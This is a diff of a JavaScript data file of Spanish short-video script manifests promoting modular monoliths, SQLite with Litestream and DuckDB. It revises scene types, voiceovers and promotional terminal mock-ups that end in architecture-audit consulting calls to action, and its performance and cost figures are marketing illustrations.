@@ -341,24 +341,36 @@ window.__BIBLIOTECA_2026__ = [
       "scenes": [
         {
           "id": "hook",
-          "type": "kinetic_hook",
-          "duration": 4.5,
+          "type": "architecture_flow",
+          "duration": 6,
           "voiceover": "¿Tu monolito se volvió un monstruo inmanejable? El error no fue el monolito: fue no definir límites de dominio.",
-          "visual_cue": "Tipografía cinética de impacto sin iconos genéricos",
+          "visual_cue": "Diagrama de arquitectura con límites estrictos de dominio y módulos aislados",
           "props": {
-            "layout": "impact",
-            "badge": "ARQUITECTURA MODERNA",
-            "lines": [
+            "header": "ARQUITECTURA MODERNA",
+            "title": "LÍMITES DE DOMINIO EN UN SOLO BINARIO",
+            "nodes": [
               {
-                "text": "EL GRAN REGRESO DEL",
-                "color": "#ffffff"
+                "id": "api",
+                "label": "API ROUTER UNIFICADO",
+                "sublabel": "Fastify / Axum Gateway",
+                "color": "#38bdf8",
+                "y": 160
               },
               {
-                "text": "MONOLITO MODULAR",
-                "color": "#38bdf8"
+                "id": "modules",
+                "label": "MÓDULOS DE DOMINIO (DDD)",
+                "sublabel": "Auth · Orders · Billing (Aislamiento en RAM)",
+                "color": "#10b981",
+                "y": 520
+              },
+              {
+                "id": "storage",
+                "label": "POSTGRES TRANSACCIONAL",
+                "sublabel": "Esquemas lógicos separados con ACID nativo",
+                "color": "#fbbf24",
+                "y": 880
               }
-            ],
-            "subtitle": "Límites de dominio en un solo binario"
+            ]
           }
         },
         {
@@ -396,45 +408,11 @@ window.__BIBLIOTECA_2026__ = [
           }
         },
         {
-          "id": "modules_arch",
-          "type": "architecture_flow",
-          "duration": 6,
-          "voiceover": "Un monolito modular vive en un solo binario, pero sus módulos están aislados como si fueran cajas negras.",
-          "visual_cue": "Diagrama de flujo mostrando módulos aislados: Auth, Billing y Inventory comunicándose por interfaces",
-          "props": {
-            "header": "ESTRUCTURA DE DOMINIO",
-            "title": "LÍMITES ESTRICTOS EN MEMORIA",
-            "nodes": [
-              {
-                "id": "api",
-                "label": "API GATEWAY INTERNO",
-                "sublabel": "Fastify / Axum Router",
-                "color": "#38bdf8",
-                "y": 160
-              },
-              {
-                "id": "modules",
-                "label": "DOMINIOS AISLADOS (DDD)",
-                "sublabel": "Orders · Billing · Users (Aislamiento de imports)",
-                "color": "#10b981",
-                "y": 520
-              },
-              {
-                "id": "storage",
-                "label": "POSTGRES TRANSACCIONAL",
-                "sublabel": "Esquemas lógicos separados en una sola DB",
-                "color": "#fbbf24",
-                "y": 880
-              }
-            ]
-          }
-        },
-        {
           "id": "code_boundary",
           "type": "code_terminal",
           "duration": 6,
           "voiceover": "En código, prohibimos las importaciones directas entre módulos. Cada dominio expone una interfaz pública estricta.",
-          "visual_cue": "Terminal mostrando TypeScript / Rust haciendo cumplir límites de módulos con ESLint / ArchUnit",
+          "visual_cue": "Terminal mostrando TypeScript haciendo cumplir límites de módulos con ESLint",
           "props": {
             "header": "REGLAS EN CI/CD",
             "title": "ENFORCEMENT DE IMPORTACIONES",
@@ -474,18 +452,17 @@ window.__BIBLIOTECA_2026__ = [
         },
         {
           "id": "cta",
-          "type": "tradeoff_matrix",
-          "duration": 4.5,
+          "type": "terminal_split",
+          "duration": 5,
           "voiceover": "Si tu equipo está atrapado en un laberinto de microservicios y quieres migrar a un monolito modular limpio, link en mi bio para auditar tu arquitectura.",
-          "visual_cue": "Cierre con tarjeta de contacto y consultoría de arquitectura",
+          "visual_cue": "Terminal de auditoría con verificación de arquitectura y llamada a la acción",
           "props": {
-            "header": "CONSULTORÍA DE ARQUITECTURA",
+            "header": "AUDITORÍA DE ARQUITECTURA (Link en bio)",
             "title": "SIMPLIFICA TU CODEBASE",
-            "subtitle": "REDUCE COSTES · MULTIPLICA VELOCIDAD",
-            "cta": {
-              "badge": "AUDITORÍA DE ARQUITECTURA (Link en bio)",
-              "text": "¿Dudas con tu arquitectura? Enlace en mi perfil para agendar una sesión técnica."
-            }
+            "leftTitle": "ANÁLISIS DE MIGRACIÓN",
+            "rightTitle": "BENEFICIOS CLAVE",
+            "leftText": "$ npx audit-architecture --inspect\n✔ Dependencias cíclicas: 0 detectadas\n✔ Aislamiento de módulos: 100% verificado\n✔ Latencia interna: 0.01ms (In-Memory)",
+            "rightText": "• Despliegue en 1 comando\n• Cero sobrecarga de Kubernetes\n• Ahorro del 60% en costos de nube\n• Agenda tu sesión: enlace en el perfil"
           }
         }
       ]
@@ -506,91 +483,74 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "direct_terminal_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Tu startup tiene tres desarrolladores y diez microservicios. Están quemando la mitad de su tiempo y presupuesto manteniendo Kubernetes.",
-          "visual_cue": "Apertura directa con terminal comparando factura mensual y tiempo de despliegue",
+          "id": "shock_hook",
+          "type": "architecture_flow",
+          "duration": 5.5,
+          "voiceover": "Netflix usa microservicios porque tiene dos mil ingenieros. Tú tienes cuatro personas y estás quemando quince mil dólares al mes.",
+          "visual_cue": "Diagrama mostrando la telaraña de microservicios vs la simplicidad de 1 binario",
           "props": {
-            "header": "EL COSTE DE LA MODA",
-            "title": "KUBERNETES VS UN SOLO SERVIDOR",
-            "subtitle": "COMPARATIVA DE COSTES REALES EN PRODUCCIÓN",
-            "termA": {
-              "title": "STACK CON MICROSERVICIOS",
-              "color": "#ef4444",
-              "cmd": "kubectl get pods --all-namespaces",
-              "status": "24 pods en ejecución · 8 clusters",
-              "time": "$3,800/mes",
-              "lines": [
-                "Factura AWS EKS + NAT Gateways: $3,800",
-                "Tiempo medio de debugging: 4 horas",
-                "Tracing distribuido obligatorio con Jaeger"
-              ]
-            },
-            "termB": {
-              "title": "MONOLITO MODULAR CON KAMAL",
-              "color": "#10b981",
-              "cmd": "kamal deploy",
-              "status": "1 solo binario en VPS dedicado",
-              "time": "$120/mes",
-              "lines": [
-                "Factura servidor Hetzner: $120/mes",
-                "Tiempo medio de deploy: 18 segundos",
-                "Logs centralizados en stdout directos"
-              ]
-            }
-          }
-        },
-        {
-          "id": "verdict_b",
-          "type": "tradeoff_matrix",
-          "duration": 6,
-          "voiceover": "Los microservicios resuelven problemas de organización cuando tienes mil ingenieros, no de rendimiento técnico.",
-          "visual_cue": "Matriz de tradeoffs demoledora",
-          "props": {
-            "header": "PRAGMATISMO TÉCNICO",
-            "title": "¿CUÁNDO USAR CADA UNO?",
-            "colA": "STARTUPS Y PYMES",
-            "colB": "BIG TECH (+500 DEVS)",
-            "rows": [
+            "header": "REALIDAD DE STARTUP",
+            "title": "SOBREINGENIERÍA VS RENTABILIDAD",
+            "nodes": [
               {
-                "dim": "Arquitectura recomendada",
-                "a": "Monolito Modular",
-                "b": "Microservicios",
-                "aGood": true
+                "id": "clients",
+                "label": "TRÁFICO REAL DE STARTUP",
+                "sublabel": "100-500 peticiones por minuto",
+                "color": "#38bdf8",
+                "y": 160
               },
               {
-                "dim": "Tiempo a producción",
-                "a": "1 semana",
-                "b": "3 meses",
-                "aGood": true
+                "id": "monolith",
+                "label": "1 BINARIO COMPILADO EN HETZNER",
+                "sublabel": "Postgres embebido o local · 0ms red",
+                "color": "#10b981",
+                "y": 520
               },
               {
-                "dim": "Mantenimiento DevOps",
-                "a": "0 personas dedicadas",
-                "b": "Equipo entero",
-                "aGood": true
+                "id": "k8s_hell",
+                "label": "KUBERNETES DISTRIBUIDO (EVITAR)",
+                "sublabel": "15 pods · Sidecars · AWS NAT Gateway carísimo",
+                "color": "#ef4444",
+                "y": 880
               }
             ]
           }
         },
         {
-          "id": "cta_b",
-          "type": "code_terminal",
-          "duration": 5,
-          "voiceover": "Si tu equipo pasa más tiempo arreglando pipelines que creando producto, audito tu arquitectura para volver a la simplicidad. Agenda en mi perfil.",
-          "visual_cue": "Terminal de contacto con auditoría técnica",
+          "id": "metrics_cost",
+          "type": "metrics_comparison",
+          "duration": 6,
+          "voiceover": "La factura de AWS: tres mil dólares en NAT Gateways y bases de datos distribuidas que solo mueven cien peticiones por minuto.",
+          "visual_cue": "Métricas de coste mensual: 15.000 dólares en microservicios vs 120 dólares en servidor bare metal",
           "props": {
-            "header": "AUDITORÍA DE ARQUITECTURA",
-            "title": "DESMANTELA LA COMPLEJIDAD",
-            "filename": "audit/contact.sh",
-            "codeLines": [
-              "# Diagnóstico de cuellos de botella y costes cloud",
-              "npx audit --target=microservices --strategy=consolidation",
-              "Resultado estimado: -75% costes y 5x velocidad de entrega",
-              "Agenda tu sesión técnica en el link de la bio."
-            ],
-            "cursorLine": 3
+            "header": "GASTO MENSUAL EN INFRAESTRUCTURA",
+            "metricA": {
+              "label": "MICROSERVICIOS K8S",
+              "value": "$14.800",
+              "sub": "NAT Gateways · Control Plane · Logs",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "MONOLITO MODULAR",
+              "value": "$140",
+              "sub": "Servidor Bare Metal en Hetzner",
+              "color": "#10b981"
+            }
+          }
+        },
+        {
+          "id": "cta_solucion",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Vuelve a lo simple: un solo repositorio, un solo pipeline, despliegue en diez segundos. Link en mi perfil si necesitas auditar tu infraestructura.",
+          "visual_cue": "Terminal con despliegue instantáneo en 10 segundos y enlace en bio",
+          "props": {
+            "header": "CONSULTORÍA TÉCNICA (Link en bio)",
+            "title": "DESPLIEGUE EN 10 SEGUNDOS",
+            "leftTitle": "PIPELINE SIMPLIFICADO",
+            "rightTitle": "BENEFICIOS DE NEGOCIO",
+            "leftText": "$ git push production main\n✔ Compilando binario único...\n✔ Tests de módulos aprobados (3.2s)\n✔ Despliegue Zero-Downtime completado",
+            "rightText": "• Reduce el gasto de AWS en 90%\n• Despliega features 5x más rápido\n• Cero llamadas rotas entre microservicios\n• ¿Evaluamos tu stack? Link en bio"
           }
         }
       ]
@@ -602,103 +562,52 @@ window.__BIBLIOTECA_2026__ = [
     "group": "02. SQLITE PRODUCCION",
     "label": "Var A (Técnico): 0ms de latencia: Arquitectura de SQLite embebido con Litestream",
     "variation": "A (Técnico)",
-    "category": "BASES DE DATOS & RENDIMIENTO",
+    "category": "BASES DE DATOS",
     "manifest": {
       "title": "[02] 0ms de latencia: Arquitectura de SQLite embebido con Litestream (Var A)",
-      "category": "BASES DE DATOS & RENDIMIENTO",
+      "category": "BASES DE DATOS",
       "slug": "02_sqlite_produccion",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "latency_hook",
+          "id": "latency_lead",
           "type": "latency_scale",
+          "duration": 5.5,
+          "voiceover": "¿Cuánto tiempo pasa tu backend esperando que PostgreSQL responda por la red? Entre cinco y cuarenta milisegundos.",
+          "visual_cue": "Gráfica de escala de latencia: red vs bus NVMe local",
+          "props": {
+            "header": "MÉTRICA DE HARDWARE",
+            "title": "EL COSTE DEL SALTO DE RED",
+            "subtitle": "RED LOCAL VS LECTURA DIRECTA EN DISCO NVMe"
+          }
+        },
+        {
+          "id": "storage_engine",
+          "type": "storage_engine_viz",
           "duration": 6.5,
-          "voiceover": "Cada vez que tu backend consulta PostgreSQL en AWS RDS, pierdes quince milisegundos en el cable de red. SQLite vive en el mismo proceso.",
-          "visual_cue": "Apertura directa con escala logarítmica de hardware mostrando el abismo de red",
+          "voiceover": "Con SQLite embebido, la base de datos corre en el mismo proceso. No hay TCP, no hay serialización: son lecturas en memoria a cero milisegundos.",
+          "visual_cue": "Visualizador del motor de almacenamiento B-Tree de SQLite y Write-Ahead Log (WAL)",
           "props": {
-            "header": "LATENCIA FÍSICA DE HARDWARE",
-            "title": "EL ABISMO DE SALIR DEL PROCESO",
-            "subtitle": "COMPARATIVA REAL DE TIEMPOS DE RESPUESTA",
-            "tiers": [
-              {
-                "name": "RAM (DDR5 BUS)",
-                "latency": "100 ns",
-                "ratio": 0.1,
-                "color": "#10b981",
-                "human": "Instante"
-              },
-              {
-                "name": "NVMe SSD LOCAL (SQLITE)",
-                "latency": "0.1 ms",
-                "ratio": 0.35,
-                "color": "#38bdf8",
-                "human": "0.1 milisegundos"
-              },
-              {
-                "name": "AWS RDS NETWORK ROUND-TRIP",
-                "latency": "18 ms",
-                "ratio": 1,
-                "color": "#ef4444",
-                "human": "180x más lento"
-              }
-            ],
-            "conclusion": "SQLite local responde antes de que el paquete TCP de Postgres salga del switch.",
-            "conclusionSub": "Eliminas completamente la latencia de serialización y sockets de red."
+            "mode": "btree",
+            "badge": "MOTOR EMBEBIDO",
+            "title": "ACCESO DIRECTO A PÁGINAS DE DISCO",
+            "subtitle": "B-TREE DE 4 KB EN MEMORIA SIN SOCKETS TCP"
           }
         },
         {
-          "id": "litestream_stream",
-          "type": "network_pipeline",
-          "duration": 6,
-          "voiceover": "¿Y los backups? Litestream replica cada transacción del WAL en milisegundos hacia un bucket S3 de forma transparente.",
-          "visual_cue": "Diagrama de pipeline de datos: WAL local escribiendo a NVMe y streameando a S3",
+          "id": "concurrency_terminal",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "¿Y la replicación? Litestream replica cada transacción a S3 en segundo plano. Cero pérdida de datos y cero mantenimiento de clústeres.",
+          "visual_cue": "Terminal mostrando benchmark de concurrencia y replicación streaming a S3",
           "props": {
-            "header": "STREAMING REPLICATION",
-            "title": "CERO PÉRDIDA DE DATOS CON LITESTREAM",
-            "subtitle": "REPLICACIÓN CONTINUA DEL WRITE-AHEAD LOG",
-            "stages": [
-              {
-                "id": "app",
-                "label": "BACKEND APP (SQLITE WAL)",
-                "sub": "Escrituras locales a 100K ops/s",
-                "y": 220,
-                "color": "#38bdf8",
-                "metric": "0.05ms"
-              },
-              {
-                "id": "litestream",
-                "label": "LITESTREAM REPLICATOR",
-                "sub": "Lee frames de WAL en background",
-                "y": 520,
-                "color": "#fbbf24",
-                "metric": "10ms lag"
-              },
-              {
-                "id": "s3",
-                "label": "AMAZON S3 / CLOUDFLARE R2",
-                "sub": "Respaldo inmutable geodistribuido",
-                "y": 820,
-                "color": "#10b981",
-                "metric": "$0.50/mes"
-              }
-            ]
-          }
-        },
-        {
-          "id": "cta_sqlite",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Si tu base de datos colapsa en picos de tráfico o estás saturando conexiones, realizo auditorías de latencia y arquitectura de datos. Enlace en mi bio.",
-          "visual_cue": "Tarjeta final con oferta de auditoría de rendimiento en base de datos",
-          "props": {
-            "header": "AUDITORÍA DE DATOS Y LATENCIA",
-            "title": "OPTIMIZA TU CAPA DE DATOS",
-            "subtitle": "ELIMINA CUELLOS DE BOTELLA",
-            "cta": {
-              "badge": "AUDITORÍA DE BASES DE DATOS (Link en bio)",
-              "text": "¿Latencia alta o saturación en tu DB? Link en mi perfil para auditar tus queries y pools."
-            }
+            "header": "AUDITORÍA DE BASES DE DATOS (Link en bio)",
+            "title": "REPLICACIÓN EN TIEMPO REAL",
+            "leftTitle": "LITESTREAM STREAMING",
+            "rightTitle": "MÉTRICAS CLAVE",
+            "leftText": "$ litestream replicate app.db s3://backups\n✔ WAL stream sincronizado\n✔ Latencia de replicación: 85ms\n✔ Recovery Point Objective (RPO): < 1s",
+            "rightText": "• 50.000 peticiones/seg en 1 CPU\n• Cero costos de RDS en Amazon\n• Backup continuo en streaming\n• Optimiza tu base: enlace en el perfil"
           }
         }
       ]
@@ -710,82 +619,61 @@ window.__BIBLIOTECA_2026__ = [
     "group": "02. SQLITE PRODUCCION",
     "label": "Var B (Polémico): ¿SQLite aguanta 50K req/s? Desmitificando la concurrencia",
     "variation": "B (Polémico)",
-    "category": "BASES DE DATOS & RENDIMIENTO",
+    "category": "BASES DE DATOS",
     "manifest": {
       "title": "[02] ¿SQLite aguanta 50K req/s? Desmitificando la concurrencia (Var B)",
-      "category": "BASES DE DATOS & RENDIMIENTO",
+      "category": "BASES DE DATOS",
       "slug": "02_sqlite_produccion",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "benchmark_hook",
+          "id": "bench_shock",
           "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Te dijeron que SQLite es solo un juguete. Aquí tienes cincuenta mil peticiones por segundo en un VPS de diez dólares con modo WAL.",
-          "visual_cue": "Apertura directa con benchmark en vivo comparando RPS y consumo de memoria",
+          "duration": 5.5,
+          "voiceover": "Existe el mito de que SQLite no aguanta concurrencia. Aquí estamos corriendo cincuenta mil peticiones por segundo en un solo servidor de cincuenta dólares.",
+          "visual_cue": "Terminal ejecutando bombardier sobre SQLite en modo WAL",
           "props": {
             "header": "BENCHMARK DE CONCURRENCIA",
-            "title": "WRK BENCHMARK · 10,000 CLIENTES CONCURRENTES",
-            "termA": {
-              "title": "POSTGRESQL EN CLOUD RDS",
-              "color": "#ef4444",
-              "cmd": "wrk -t8 -c200 -d10s http://api/pg",
-              "status": "Saturando pool de conexiones",
-              "time": "4,200 req/s",
-              "lines": [
-                "Latencia p99: 42.1ms (Network queue)",
-                "CPU al 85% en RDS micro",
-                "Coste mensual estimado: $180"
-              ]
-            },
-            "termB": {
-              "title": "SQLITE EMBEDDED CON WAL",
-              "color": "#10b981",
-              "cmd": "wrk -t8 -c200 -d10s http://api/sqlite",
-              "status": "Lectura directa de NVMe con page cache",
-              "time": "52,400 req/s",
-              "lines": [
-                "Latencia p99: 0.8ms (Sub-milisegundo)",
-                "CPU al 22% en VPS de $10",
-                "Coste mensual: $10 (Hetzner VPS)"
-              ]
-            }
+            "title": "50.000 PETICIONES POR SEGUNDO",
+            "leftTitle": "EJECUCIÓN DE PRUEBA",
+            "rightTitle": "RESULTADO DE ESTRÉS",
+            "leftText": "$ k6 run --vus 500 --duration 10s stress.js\n✔ 500 conexiones simultáneas activas\n✔ WAL mode: enabled (Multi-reader/1-writer)\n✔ Errores 5xx: 0% (0 fallos de bloqueo)",
+            "rightText": "• Throughput: 51.420 req/sec\n• P99 Latency: 0.18 ms\n• Uso de CPU: 42% en 4 núcleos\n• SQLite en NVMe destruye mitos"
           }
         },
         {
-          "id": "wal_mode",
-          "type": "code_terminal",
+          "id": "storage_tree",
+          "type": "storage_engine_viz",
           "duration": 6,
-          "voiceover": "Con el modo WAL activado, los lectores nunca bloquean a los escritores y las lecturas son concurrentes y paralelas.",
-          "visual_cue": "Terminal configurando PRAGMA journal_mode=WAL y synchronous=NORMAL",
+          "voiceover": "El secreto es el modo WAL: los lectores nunca bloquean a los escritores y las lecturas van directo a la memoria caché del kernel.",
+          "visual_cue": "Visualizador del motor B-Tree con el WAL recibiendo escrituras secuenciales",
           "props": {
-            "header": "CONFIGURACIÓN DE PRODUCCIÓN",
-            "title": "MODO WAL Y CONCURRENCIA",
-            "filename": "db/setup.sql",
-            "codeLines": [
-              "-- Activa escritura paralela sin bloqueo de lectores",
-              "PRAGMA journal_mode = WAL;",
-              "PRAGMA synchronous = NORMAL;",
-              "PRAGMA busy_timeout = 5000;",
-              "PRAGMA cache_size = -64000; -- 64MB RAM Cache",
-              "-- 50.000 lecturas/s por núcleo de CPU"
-            ],
-            "cursorLine": 5
+            "mode": "btree",
+            "badge": "CONCURRENCIA WAL",
+            "title": "READERS NO BLOQUEAN A WRITERS",
+            "subtitle": "ESCRITURAS APPEND-ONLY EN EL WAL LOG"
           }
         },
         {
-          "id": "cta_sqlite_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Si tu factura de base de datos se salió de control y quieres optimizar tu arquitectura, reviso tu stack técnico. Link en mi biografía.",
-          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
+          "id": "metrics_compare",
+          "type": "metrics_comparison",
+          "duration": 6,
+          "voiceover": "Si tu app no mueve más de mil escrituras por segundo, pagar por RDS en AWS es botar el dinero. Link en mi bio si quieres auditar tu arquitectura de datos.",
+          "visual_cue": "Comparativa de costos y latencia: RDS Postgres vs SQLite Litestream",
           "props": {
-            "header": "AUDITORÍA TÉCNICA DE BASES DE DATOS",
-            "title": "REDUCE COSTES · ELEVA CONCURRENCIA",
-            "cta": {
-              "badge": "AUDITORÍA DE DATOS (Link en perfil)",
-              "text": "¿Tu base de datos está lenta o cara? Agenda una auditoría técnica en el enlace del perfil."
+            "header": "CONSULTORÍA DE DATOS (Link en bio)",
+            "metricA": {
+              "label": "AWS RDS POSTGRES",
+              "value": "$850 / mes",
+              "sub": "Latencia de red: 15ms · Complejidad",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "SQLITE + LITESTREAM",
+              "value": "$45 / mes",
+              "sub": "Latencia local: 0.05ms · Cero Ops",
+              "color": "#10b981"
             }
           }
         }
@@ -798,89 +686,82 @@ window.__BIBLIOTECA_2026__ = [
     "group": "03. DUCKDB ANALYTICS",
     "label": "Var A (Técnico): Procesamiento Columnar Vectorizado: 10M filas en milisegundos",
     "variation": "A (Técnico)",
-    "category": "DATA ENGINEERING & ANALYTICS",
+    "category": "DATA ENGINEERING",
     "manifest": {
       "title": "[03] Procesamiento Columnar Vectorizado: 10M filas en milisegundos (Var A)",
-      "category": "DATA ENGINEERING & ANALYTICS",
+      "category": "DATA ENGINEERING",
       "slug": "03_duckdb_analytics",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "stat_hook",
-          "type": "kinetic_hook",
-          "duration": 4.5,
-          "voiceover": "¿Diez millones de filas analizadas en medio segundo dentro de tu laptop? Así funciona el procesamiento columnar de DuckDB.",
-          "visual_cue": "Gancho cinético con número cuantitativo gigante",
+          "id": "columnar_viz",
+          "type": "storage_engine_viz",
+          "duration": 6.5,
+          "voiceover": "¿Por qué DuckDB analiza diez millones de filas en milisegundos mientras Postgres colapsa? Todo está en el formato columnar y las instrucciones SIMD.",
+          "visual_cue": "Visualizador del motor columnar vectorizado procesando bloques contiguos de memoria con SIMD",
           "props": {
-            "layout": "stat",
-            "badge": "ANALÍTICA DE DATOS",
-            "stat": "10.000.000",
-            "statLabel": "Filas procesadas en 420ms",
-            "subtitle": "Procesamiento columnar vectorizado"
+            "mode": "columnar",
+            "badge": "MOTOR VECTORIZADO",
+            "title": "FILAS TRADICIONALES VS COLUMNAS SIMD",
+            "subtitle": "DUCKDB: PROCESAMIENTO POR LOTES DE VECTORES"
           }
         },
         {
-          "id": "row_vs_col",
-          "type": "memory_layout",
-          "duration": 6,
-          "voiceover": "Las bases transaccionales leen filas enteras, desperdiciando caché de CPU. DuckDB lee solo las columnas que necesitas en vectores contiguos.",
-          "visual_cue": "Comparación visual de layout de memoria: Row-oriented vs Columnar Vectorized",
-          "props": {
-            "header": "MEMORIA Y HARDWARE",
-            "title": "ROW-STORE VS COLUMN-STORE",
-            "items": [
-              {
-                "name": "POSTGRES (ROW-STORE)",
-                "addr": "Heap Tuple: Lee todos los campos de disco",
-                "value": "Desperdicio de CPU L3 Cache",
-                "color": "#ef4444"
-              },
-              {
-                "name": "DUCKDB (VECTORIZED)",
-                "addr": "Vector Chunk: 2048 enteros contiguos",
-                "value": "Aceleración SIMD directa en CPU",
-                "color": "#10b981"
-              }
-            ]
-          }
-        },
-        {
-          "id": "parquet_query",
+          "id": "code_parquet",
           "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Puedes consultar archivos Parquet directamente en Amazon S3 sin importar los datos. Solo descargas los bytes exactos que pide tu consulta.",
-          "visual_cue": "Terminal ejecutando query SQL directa sobre s3://bucket/data.parquet",
+          "duration": 5,
+          "voiceover": "DuckDB lee archivos Parquet directamente desde S3 o tu disco local sin levantar servidores pesados ni pipelines de Kafka.",
+          "visual_cue": "Terminal mostrando consulta SQL directa sobre Parquet sin ingesta previa",
           "props": {
-            "header": "CONSULTA DIRECTA SOBRE PARQUET",
-            "title": "ZERO-ETL ANALYTICS",
-            "filename": "analytics/query.py",
+            "header": "QUERY IN-PROCESS",
+            "title": "CONSULTA DIRECTA SOBRE PARQUET",
+            "filename": "analytics.sql",
             "codeLines": [
-              "import duckdb",
-              "# Lee 50GB en S3 descargando solo 40MB de metadata:",
-              "res = duckdb.query(\"\"\"",
-              "  SELECT user_country, SUM(amount_usd) ",
-              "  FROM read_parquet(\"s3://logs-2026/*.parquet\")",
-              "  GROUP BY 1 ORDER BY 2 DESC LIMIT 10;",
-              "\"\"\").df()",
-              "print(f\"Completado en {res.execution_time}ms\")"
+              "# Consulta in-process sin servidor intermedio:",
+              "SELECT country, SUM(total_amount)",
+              "FROM \"s3://warehouse/sales_2026/*.parquet\"",
+              "WHERE created_at >= \"2026-01-01\"",
+              "GROUP BY country ORDER BY 2 DESC;"
             ],
-            "cursorLine": 6
+            "cursorLine": 4
           }
         },
         {
-          "id": "cta_duckdb",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Si tu empresa gasta miles de dólares en Snowflake o BigQuery para consultas simples, audito tus costes de datos para migrar a motores in-process. Link en bio.",
-          "visual_cue": "Cierre con llamado a auditoría de costes cloud de datos",
+          "id": "metrics_speed",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "El resultado: consultas analíticas hasta ochenta veces más rápidas usando una fracción de la memoria.",
+          "visual_cue": "Comparativa de velocidad analítica: Postgres vs DuckDB",
           "props": {
-            "header": "AUDITORÍA DE COSTES CLOUD",
-            "title": "REDUCE TU FACTURA DE ANALÍTICA",
-            "cta": {
-              "badge": "AUDITORÍA DE COSTES (Link en bio)",
-              "text": "¿Gastas fortunas en Snowflake o Databricks? Link en mi perfil para auditar tus pipelines."
+            "header": "AGREGACIÓN SOBRE 10M FILAS",
+            "metricA": {
+              "label": "POSTGRESQL (ROW)",
+              "value": "18.4 seg",
+              "sub": "Escaneo completo de filas en disco",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "DUCKDB (COLUMNAR)",
+              "value": "0.24 seg",
+              "sub": "SIMD AVX-512 sobre vectores en RAM",
+              "color": "#10b981"
             }
+          }
+        },
+        {
+          "id": "cta_data",
+          "type": "terminal_split",
+          "duration": 4.5,
+          "voiceover": "Si tu equipo gasta fortunas en Snowflake o Databricks para analítica básica, link en bio para modernizar tu pipeline de datos.",
+          "visual_cue": "Terminal de auditoría con optimización de analítica in-process",
+          "props": {
+            "header": "CONSULTORÍA DE DATOS (Link en bio)",
+            "title": "ANALÍTICA SIN SERVIDORES",
+            "leftTitle": "INSPECCIÓN DE DATA PIPELINES",
+            "rightTitle": "AHORRO INMEDIATO",
+            "leftText": "$ npx audit-data-stack\n✔ Warehouse actual: Snowflake ($14K/mes)\n✔ Cargas de trabajo: 92% agregaciones simples\n✔ Migración recomendada: DuckDB + Parquet",
+            "rightText": "• Elimina el 85% de tu factura analítica\n• Respuestas en milisegundos en vez de minutos\n• Cero mantenimiento de infraestructura\n• ¿Agendamos revisión? Enlace en perfil"
           }
         }
       ]
@@ -892,62 +773,47 @@ window.__BIBLIOTECA_2026__ = [
     "group": "03. DUCKDB ANALYTICS",
     "label": "Var B (Polémico): Snowflake es un desperdicio: Analítica in-process con Parquet",
     "variation": "B (Polémico)",
-    "category": "DATA ENGINEERING & ANALYTICS",
+    "category": "DATA ENGINEERING",
     "manifest": {
       "title": "[03] Snowflake es un desperdicio: Analítica in-process con Parquet (Var B)",
-      "category": "DATA ENGINEERING & ANALYTICS",
+      "category": "DATA ENGINEERING",
       "slug": "03_duckdb_analytics",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "cost_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Las empresas queman cinco mil dólares al mes en Snowflake para correr reportes que una máquina de diez dólares procesa en segundos con DuckDB.",
-          "visual_cue": "Apertura directa con comparativa de costes de Snowflake vs DuckDB",
+          "id": "bill_shock",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Tu startup paga catorce mil dólares mensuales en Snowflake para hacer queries que caben perfectamente en la memoria de una laptop.",
+          "visual_cue": "Métricas de coste comparando Snowflake vs DuckDB",
           "props": {
-            "header": "COMPARATIVA DE FACTURACIÓN",
-            "title": "CLOUD DATA WAREHOUSE VS IN-PROCESS",
-            "termA": {
-              "title": "SNOWFLAKE / BIGQUERY CLUSTER",
-              "color": "#ef4444",
-              "cmd": "Warehouse XS Always-On + Storage fees",
-              "status": "Créditos computacionales consumiéndose",
-              "time": "$4,500/mes",
-              "lines": [
-                "Egress data transfer costs: $650",
-                "Tiempo de arranque de warehouse: 8 segundos",
-                "Lock-in de proveedor propietario"
-              ]
+            "header": "DESPERDICIO DE NUBE EN ANALÍTICA",
+            "metricA": {
+              "label": "SNOWFLAKE WAREHOUSE",
+              "value": "$14.200",
+              "sub": "Factura mensual recurrente en la nube",
+              "color": "#ef4444"
             },
-            "termB": {
-              "title": "DUCKDB EMBEDDED + PARQUET EN S3",
-              "color": "#10b981",
-              "cmd": "duckdb server.duckdb --readonly",
-              "status": "Motor C++ embebido en contenedor",
-              "time": "$80/mes",
-              "lines": [
-                "Almacenamiento en S3 estándar: $45",
-                "Instancia Hetzner 64GB RAM: $35",
-                "Formato abierto Parquet y Apache Iceberg"
-              ]
+            "metricB": {
+              "label": "DUCKDB + S3 PARQUET",
+              "value": "$85",
+              "sub": "Almacenamiento S3 + CPU del servidor",
+              "color": "#10b981"
             }
           }
         },
         {
-          "id": "cta_duckdb_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la arquitectura de datos de tu empresa para recortar sobrecostes de infraestructura. Escríbeme o agenda tu sesión en el link de mi perfil.",
-          "visual_cue": "Cierre con auditoría de infraestructura de datos",
+          "id": "columnar_diagram",
+          "type": "storage_engine_viz",
+          "duration": 6,
+          "voiceover": "DuckDB corre embebido en tu API de Node o Python. Lee Parquet comprimido con Dictionary Encoding y procesa cien mil registros en milisegundos.",
+          "visual_cue": "Visualizador del almacenamiento columnar demostrando el 94% menos de I/O en lecturas",
           "props": {
-            "header": "AUDITORÍA DE INFRAESTRUCTURA",
